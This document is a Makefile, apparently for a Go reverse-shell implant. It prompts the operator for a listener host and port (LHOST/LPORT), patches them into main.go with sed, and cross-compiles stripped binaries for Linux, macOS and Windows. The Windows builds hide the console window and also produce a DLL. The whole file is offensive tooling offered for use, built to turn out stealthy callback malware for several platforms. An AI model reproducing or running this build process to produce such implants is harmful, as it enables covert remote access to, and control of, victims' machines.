BUILDPATH=$(CURDIR)
GO=$(shell which go)
GOBUILD=$(GO) build
GOINSTALL=$(GO) install
GOCLEAN=$(GO) clean

EXEBUILD=main.go
EXEFILE=main
EXENAME=$(notdir $(CURDIR))
CLEAN ?= $(shell bash -c 'sed -i -E "s/([0-9]{1,3}[\.]){3}[0-9]{1,3}:[0-9]{1,5}/LHOST:LPORT/g" main.go')
LHOST ?= $(shell bash -c 'read -p "LHOST: " LHOST; sed -i "s/LHOST/$$LHOST/g" main.go')
LPORT ?= $(shell bash -c 'read -p "LPORT: " LPORT; sed -i "s/LPORT/$$LPORT/g" main.go')
BINARY ?= $(shell bash -c 'ls $(CURDIR) | grep -i "rshellxf*"')
 
binary:
	@echo $(BINARY)

linux:
	@echo $(CLEAN)
	@echo $(LHOST)
	@echo $(LPORT)
	GOARCH=amd64 GOOS=linux go build -ldflags="-s -w" -o $(EXENAME)

darwin:
	@echo $(CLEAN)
	@echo $(LHOST)
	@echo $(LPORT)
	GOARCH=amd64 GOOS=darwin go build -ldflags="-s -w" -o $(EXENAME)-darwin

windows:
	@echo $(CLEAN)
	@echo $(LHOST)
	@echo $(LPORT)
	GOARCH=amd64 GOOS=windows go build -ldflags="-s -w -H=windowsgui" -o $(EXENAME).exe
	GOARCH=amd64 GOOS=windows CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-s -w -H=windowsgui" -o $(EXENAME).dll

all:
	@echo $(CLEAN)
	@echo $(LHOST)
	@echo $(LPORT)
	GOARCH=amd64 GOOS=linux go build -ldflags="-s -w" -o $(EXENAME)
	GOARCH=amd64 GOOS=darwin go build -ldflags="-s -w" -o $(EXENAME)-darwin
	GOARCH=amd64 GOOS=windows go build -ldflags="-s -w -H=windowsgui" -o $(EXENAME).exe
	GOARCH=amd64 GOOS=windows CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-s -w -H=windowsgui" -o $(EXENAME).dll

clean:
	@echo $(CLEAN)
	@for binary in $(BINARY); do if [ -f $$binary ];then rm $$binary;fi;done

